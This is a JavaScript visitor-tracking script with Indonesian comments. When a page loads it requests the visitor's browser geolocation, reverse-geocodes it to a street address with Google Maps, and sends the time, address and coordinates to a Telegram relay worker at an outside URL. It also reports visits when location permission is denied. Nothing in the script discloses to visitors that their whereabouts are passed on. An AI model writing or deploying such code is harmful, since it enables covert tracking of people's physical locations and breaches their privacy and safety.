// visitor-tracker.js - Versi dengan Google Maps JavaScript API (reverse geocoding client-side)
const TELEGRAM_WORKER_URL = 'https://telegram-notifier.awalgultom123.workers.dev';

async function kirimNotifikasi(pesan) {
    try {
        const response = await fetch(TELEGRAM_WORKER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: pesan })
        });
        if (!response.ok) console.error('Telegram worker error');
        else console.log('Notifikasi terkirim');
    } catch (error) {
        console.error('Gagal kirim notifikasi:', error);
    }
}

// Fungsi untuk mengubah koordinat menjadi alamat menggunakan Google Maps Geocoding (client-side)
function reverseGeocode(lat, lng, callback) {
    const geocoder = new google.maps.Geocoder();
    const latlng = { lat: parseFloat(lat), lng: parseFloat(lng) };
    geocoder.geocode({ location: latlng }, (results, status) => {
        if (status === 'OK' && results[0]) {
            callback(results[0].formatted_address);
        } else {
            callback(null);
        }
    });
}

// Cek apakah browser mendukung geolocation
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(async (position) => {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        
        // Dapatkan alamat menggunakan Google Maps Geocoding
        reverseGeocode(lat, lng, async (alamat) => {
            const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
            let pesan;
            if (alamat) {
                pesan = `⚠️ Ada yang kepoin nih! ⚠️\n\nWaktu: ${waktu}\nLokasi Real: ${alamat}\nKoordinat: ${lat}, ${lng}`;
            } else {
                pesan = `⚠️ Ada yang kepoin nih! ⚠️\n\nWaktu: ${waktu}\nKoordinat: ${lat}, ${lng}\n(Gagal dapat alamat detail)`;
            }
            await kirimNotifikasi(pesan);
        });
    }, (error) => {
        console.error('Gagal dapatkan lokasi pengunjung:', error);
        kirimNotifikasi(`⚠️ Ada yang kepoin, tapi izin lokasi ditolak atau gagal.\nError: ${error.message}`);
    });
} else {
    console.log('Geolocation tidak didukung browser ini.');
    kirimNotifikasi('⚠️ Ada yang kepoin, tapi browser tidak mendukung geolokasi.');
}
